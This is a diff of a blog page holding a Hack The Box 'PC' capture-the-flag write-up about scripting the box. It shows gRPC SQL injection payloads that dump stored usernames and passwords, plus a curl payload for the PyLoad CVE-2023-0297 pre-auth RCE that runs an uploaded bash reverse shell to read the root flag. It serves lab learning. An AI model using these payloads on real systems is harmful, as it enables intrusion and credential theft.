@@ -1,31 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="author" content="">
-    <meta name="description"
-        content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself." />
-    <meta name="keywords" content="homepage, blog, untagged" />
-    <meta name="robots" content="noodp" />
-    <meta name="theme-color" content="" />
-    <link rel="canonical" href="https://baishya.xyz/posts/htb-pc/" />
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself." />
+<meta name="keywords" content="homepage, blog, htb, automation" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://baishya.xyz/posts/htb-pc/" />
 
 
     <title>
-
-        Hack the Box — PC, but automated :: Bayesian Blogs
-
+        
+            Hack the Box — PC, but automated :: Bayesian Blogs 
+        
     </title>
 
 
 
 
 
-    <link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css"
-        integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+<link rel="stylesheet" href="/main.30656cf6cc2ee1a47aa579e5c4bd5726f790db131f71835d5ccccbfc6f4b8ec1.css" integrity="sha256-MGVs9swu4aR6pXnlxL1XJveQ2xMfcYNdXMzL/G9LjsE=">
+
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -36,31 +35,23 @@
     <meta name="msapplication-TileColor" content="">
 
 
-    <meta itemprop="name" content="Hack the Box — PC, but automated">
-    <meta itemprop="description"
-        content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.">
-    <meta itemprop="datePublished" content="2024-01-29T20:05:09-08:00" />
-    <meta itemprop="dateModified" content="2024-01-29T20:05:09-08:00" />
-    <meta itemprop="wordCount" content="1250">
-    <meta itemprop="image" content="https://baishya.xyz" />
-    <meta itemprop="keywords" content="untagged," />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://baishya.xyz" />
-    <meta name="twitter:title" content="Hack the Box — PC, but automated" />
-    <meta name="twitter:description"
-        content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself." />
+<meta itemprop="name" content="Hack the Box — PC, but automated">
+<meta itemprop="description" content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself."><meta itemprop="datePublished" content="2023-11-06T20:05:09-08:00" />
+<meta itemprop="dateModified" content="2023-11-06T20:05:09-08:00" />
+<meta itemprop="wordCount" content="1250"><meta itemprop="image" content="https://baishya.xyz" />
+<meta itemprop="keywords" content="htb,automation," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://baishya.xyz" /><meta name="twitter:title" content="Hack the Box — PC, but automated"/>
+<meta name="twitter:description" content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself."/>
 
 
 
     <meta property="og:title" content="Hack the Box — PC, but automated" />
-    <meta property="og:description"
-        content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself." />
-    <meta property="og:type" content="article" />
-    <meta property="og:url" content="https://baishya.xyz/posts/htb-pc/" />
-    <meta property="og:image" content="https://baishya.xyz" />
-    <meta property="article:section" content="posts" />
-    <meta property="article:published_time" content="2024-01-29T20:05:09-08:00" />
-    <meta property="article:modified_time" content="2024-01-29T20:05:09-08:00" />
+<meta property="og:description" content="PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://baishya.xyz/posts/htb-pc/" /><meta property="og:image" content="https://baishya.xyz" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-06T20:05:09-08:00" />
+<meta property="article:modified_time" content="2023-11-06T20:05:09-08:00" />
 
 
 
@@ -68,9 +59,7 @@
 
 
 
-    <meta property="article:published_time" content="2024-01-29 20:05:09 -0800 PST" />
-
-
+    <meta property="article:published_time" content="2023-11-06 20:05:09 -0800 PST" />
 
 
 
@@ -80,389 +69,305 @@
 
 
 
-</head>
 
 
-<body>
+    </head>
 
-
-    <div class="container">
-        <header class="header">
-            <span class="header__inner">
-                <a href="/" style="text-decoration: none;">
-                    <div class="logo">
-
-                        <span class="logo__mark">&gt;</span>
-                        <span class="logo__text ">
-                            cd /home</span>
-                        <span class="logo__cursor" style="
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                cd /home</span>
+            <span class="logo__cursor" style=
+                  "
                    
                    ">
-                        </span>
-
-                    </div>
-                </a>
-
-
-                <span class="header__right">
-
-                    <nav class="menu">
-                        <ul class="menu__inner">
-                            <li><a href="/about">About</a></li>
-                            <li><a href="/posts">Blog</a></li>
-                        </ul>
-                    </nav>
-
-                    <span class="menu-trigger">
-                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                            <path d="M0 0h24v24H0z" fill="none" />
-                            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-                        </svg>
-                    </span>
-
-                </span>
             </span>
-        </header>
+        
+    </div>
+</a>
 
 
-        <div class="content">
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Blog</a></li><li><a href="/cocktails">Cocktails</a></li>
+    </ul>
+</nav>
 
-            <main class="post">
-
-                <div class="post-info">
-                    <p>
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-                            class="feather feather-clock">
-                            <circle cx="12" cy="12" r="10"></circle>
-                            <polyline points="12 6 12 12 16 14"></polyline>
-                        </svg>
-                        6 minutes
-
-
-                    </p>
-                </div>
-
-                <article>
-                    <h1 class="post-title">
-                        <a href="https://baishya.xyz/posts/htb-pc/">Hack the Box — PC, but automated</a>
-                    </h1>
-
-
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
 
 
-                    <hr />
-                    <aside id="toc">
-                        <div class="toc-title">Table of Contents</div>
-                        <nav id="TableOfContents">
-                            <ul>
-                                <li><a href="#setup-grpc">Setup grpc</a></li>
-                                <li><a href="#sql-injection-in-grpc">SQL Injection in grpc</a></li>
-                                <li><a href="#getting-user-flag">Getting user flag</a></li>
-                                <li><a href="#pyload-cve">PyLoad CVE</a></li>
-                                <li><a href="#closing-thoughts">Closing Thoughts</a></li>
-                            </ul>
-                        </nav>
-                    </aside>
-                    <hr />
+            <div class="content">
+                
+  <main class="post">
 
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        6 minutes
 
+        
+      </p>
+    </div>
 
-                    <div class="post-content">
-                        <p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application
-                            running on it. While doing this box, I had gone to the forums for a hint, and I saw a
-                            comment that said something along the lines of “I wrote a script that can solve this box”. I
-                            found this quite intriguing and decided to write a script that could solve the box myself.
-                        </p>
-                        <p><em>Note 1: This is not a proper write-up of the PC box. There is already an official
-                                write-up by the creator of the box which is very thorough and explains all the details
-                                of the box. There are many unofficial writeups as well. There’s also ippsec’s video on
-                                his channel.</em></p>
-                        <p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It
-                                does not automate the looking for the vulnerabilities part. After I completed the box, I
-                                automated the steps I took to get the flags.</em></p>
-                        <p>The complete code for this script can be found on <a
-                                href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
-                        <h2 id="setup-grpc">Setup grpc</h2>
-                        <p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we
-                            need a grpc client. I followed a <a
-                                href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a
-                            grpc client using thegrpcio-tools Python library. The first step was to define the service
-                            in a .proto file. My service definition is here. Once the service is defined grpcio-tools
-                            can generate the client code for you. You can use a command like this:</p>
-                        <pre tabindex="0"><code>$ python -m grpc_tools.protoc -I../../protos --python_out=. --pyi_out=. --grpc_python_out=. SimpleApp.proto
-</code></pre>
-                        <p>For me, this generated 2 additional files, <a
-                                href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a>
-                            and <a
-                                href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a>
-                            . I will not explain what these files do here, since that itself is a lengthy topic of
-                            discussion. If you are curious, the tutorial link I added earlier has a lot of resources to
-                            understand grpc and how it works.</p>
-                        <p>Once we have the required files generated, we can connect to the grpc service:</p>
-                        <pre tabindex="0"><code>def _setup_grpc(self):
-    channel = grpc.insecure_channel(f&#34;{self.host}:{self.grpc_port}&#34;)
-    stub = pb2_grpc.SimpleAppStub(channel)
+    <article>
+      <h1 class="post-title">
+        <a href="https://baishya.xyz/posts/htb-pc/">Hack the Box — PC, but automated</a>
+      </h1>
 
-    return stub
-</code></pre>
-                        <p>Here <code>pb2_grpc</code> contains the client and server classes corresponding to
-                            protobuf-defined grpc services.</p>
-                        <h2 id="sql-injection-in-grpc">SQL Injection in grpc</h2>
-                        <p>The grpc service exposes a <code>getInfoRequest</code> which takes an id parameter. It then
-                            uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can
-                            exploit it by making a query like:</p>
-                        <pre tabindex="0"><code>query = &#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;
-pb2.getInfoRequest(id=query) 
-</code></pre>
-                        <p>Here <code>pb2</code> is the protobuf client we will use to interact with the grpc service.
-                            The above request will get the tables from <code>sqlite_master</code>.</p>
-                        <p>This does not work out of the box, however. It requires an admin token to be sent as
-                            metadata. We can obtain the token by sending a <code>LoginUserRequest</code>. The
-                            username/password is conveniently set to admin/admin.</p>
-                        <pre tabindex="0"><code>def _get_token(self):
-    user = pb2.LoginUserRequest(username=&#34;admin&#34;, password=&#34;admin&#34;)
-    _, call = self.stub.LoginUser.with_call(user)
-    metadata = call.trailing_metadata()
-    token = metadata[0].value[2:-1]
+      
 
-    return token
-</code></pre>
-                        <p>Once I had the token, I could make the <code>getInfoRequest</code> request and get the user
-                            details. To get the user details, I first got the table name, then the columns in the table,
-                            and finally queried all the columns of the table.</p>
-                        <pre tabindex="0"><code>def _get_users(self) -&gt; dict:
-    print(&#34;Getting users&#34;)
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup-grpc">Setup grpc</a></li>
+    <li><a href="#sql-injection-in-grpc">SQL Injection in grpc</a></li>
+    <li><a href="#getting-user-flag">Getting user flag</a></li>
+    <li><a href="#pyload-cve">PyLoad CVE</a></li>
+    <li><a href="#closing-thoughts">Closing Thoughts</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
 
-    query = &#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;
-    table = self._sql_injection_request(query)
+      
 
-    query = f&#34;62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info(&#39;{table}&#39;)&#34;
-    cols = self._sql_injection_request(query)
+      <div class="post-content">
+        <p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</p>
+<p><em>Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There’s also ippsec’s video on his channel.</em></p>
+<p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
+<p>The complete code for this script can be found on <a href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
+<h2 id="setup-grpc">Setup grpc</h2>
+<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using thegrpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is here. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -m grpc_tools.protoc -I../../protos --python_out<span style="color:#f92672">=</span>. --pyi_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. SimpleApp.proto
+</span></span></code></pre></div><p>For me, this generated 2 additional files, <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a> and <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a> . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.</p>
+<p>Once we have the required files generated, we can connect to the grpc service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_setup_grpc</span>(self):
+</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>grpc_port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    stub <span style="color:#f92672">=</span> pb2_grpc<span style="color:#f92672">.</span>SimpleAppStub(channel)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> stub
+</span></span></code></pre></div><p>Here <code>pb2_grpc</code> contains the client and server classes corresponding to protobuf-defined grpc services.</p>
+<h2 id="sql-injection-in-grpc">SQL Injection in grpc</h2>
+<p>The grpc service exposes a <code>getInfoRequest</code> which takes an id parameter. It then uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can exploit it by making a query like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query) 
+</span></span></code></pre></div><p>Here <code>pb2</code> is the protobuf client we will use to interact with the grpc service. The above request will get the tables from <code>sqlite_master</code>.</p>
+<p>This does not work out of the box, however. It requires an admin token to be sent as metadata. We can obtain the token by sending a <code>LoginUserRequest</code>. The username/password is conveniently set to admin/admin.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_token</span>(self):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>LoginUserRequest(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>)
+</span></span><span style="display:flex;"><span>    _, call <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>LoginUser<span style="color:#f92672">.</span>with_call(user)
+</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> call<span style="color:#f92672">.</span>trailing_metadata()
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> metadata[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>value[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span></code></pre></div><p>Once I had the token, I could make the <code>getInfoRequest</code> request and get the user details. To get the user details, I first got the table name, then the columns in the table, and finally queried all the columns of the table.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_users</span>(self) <span style="color:#f92672">-&gt;</span> dict:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Getting users&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>    table <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info(&#39;</span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>    cols <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> col <span style="color:#f92672">in</span> cols<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>):
+</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(</span><span style="color:#e6db74">{</span>col<span style="color:#e6db74">}</span><span style="color:#e6db74">) FROM </span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
+</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    usernames <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    passwords <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    users <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(usernames)):
+</span></span><span style="display:flex;"><span>        users<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;username&#34;</span>: usernames[i], <span style="color:#e6db74">&#34;password&#34;</span>: passwords[i]})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Users found&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(json<span style="color:#f92672">.</span>dumps(users))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> users
+</span></span></code></pre></div><p>The <code>_sql_injection_request</code> function is defined as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sql_injection_request</span>(self, query):
+</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;token&#34;</span>, self<span style="color:#f92672">.</span>token),)
+</span></span><span style="display:flex;"><span>    id_request <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query)
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>getInfo<span style="color:#f92672">.</span>with_call(id_request, metadata<span style="color:#f92672">=</span>metadata)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>message
+</span></span></code></pre></div><h2 id="getting-user-flag">Getting user flag</h2>
+<p>The user list has a user <code>sau</code> , who has SSH access to the machine. The next step is to start an SSH session and read the user flag stored at <code>/home/sau/user.txt</code>. This is quite straightforward. I created a simple SSH Client using the <code>paramiko</code> library and executed <code>cat /home/sau/user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_command</span>(self, command):
+</span></span><span style="display:flex;"><span>    ssh_stdin, ssh_stdout, ssh_stderr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>exec_command(command)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssh_stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span></code></pre></div><h2 id="pyload-cve">PyLoad CVE</h2>
+<p>PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are vulnerable to pre-auth RCE (CVE-2023–0297). There are many available exploits for this vulnerability. You can read more about the vulnerability and the exploit <a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">here</a>.</p>
+<p>The vulnerability allows us to execute a payload like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data-binary
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/home/sau/shell.sh\&#34;);f=function%20f2()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">$&#39;http://localhost:8000/flash/addcrypted2&#39;</span>
+</span></span></code></pre></div><p>Here, I am running a script called <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a> which is just a bash reverse shell.</p>
+<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternative option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
+<p>I used SFTP to transfer the reverse shell to the box:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer_file_from_local</span>(self):
+</span></span><span style="display:flex;"><span>    ftp_client <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>open_sftp()
+</span></span><span style="display:flex;"><span>    ftp_client<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;shell.sh&#34;</span>, <span style="color:#e6db74">&#34;/home/sau/shell.sh&#34;</span>)
+</span></span></code></pre></div><p>The last step is to start a reverse shell listener and then read the root flag from within the reverse shell session. For this, I created a simple <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py">socket client</a> which listens for a connection and then performs <code>cat /root/root.txt</code>.</p>
+<p>I ran both the exploitation script and the socket client as two separate processes using a shell script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>python auto_exploit.py &amp;
+</span></span><span style="display:flex;"><span>python revsh.py
+</span></span></code></pre></div><p>It might (should) be possible to run the exploitation part and socket listener as separate threads of the same process. I tried for a bit, but it didn’t work and I just chose the easy way out.</p>
+<p>Running the runner script, I got both the user and root flags:</p>
+<p><img src="/flags.webp" alt="Flags"></p>
+<h2 id="closing-thoughts">Closing Thoughts</h2>
+<p>This experiment was a lot of fun. After completing this box, I pondered over what makes a box scriptable. I think the correct answer is — all boxes are scriptable if one is willing to persevere. The more practical questions what makes a box easy to script. I have come up with these criteria:</p>
+<ul>
+<li>Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar — but that increases the complexity of the script.</li>
+<li>Related to the above — requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.</li>
+<li>Has a lot of steps / requires running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
+</ul>
+<p>This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.</p>
+<p>That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don’t work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.</p>
+<p>Thanks for reading!</p>
 
-    res = []
-    for col in cols.split(&#34;,&#34;):
-        query = f&#34;62 UNION SELECT GROUP_CONCAT({col}) FROM {table}&#34;
-        r = self._sql_injection_request(query)
-        res.append(r.split(&#34;,&#34;))
+      </div>
+    </article>
 
-    usernames = res[0]
-    passwords = res[1]
+    <hr />
 
-    users = []
-    for i in range(len(usernames)):
-        users.append({&#34;username&#34;: usernames[i], &#34;password&#34;: passwords[i]})
+    <div class="post-info">
+      
+    <p>
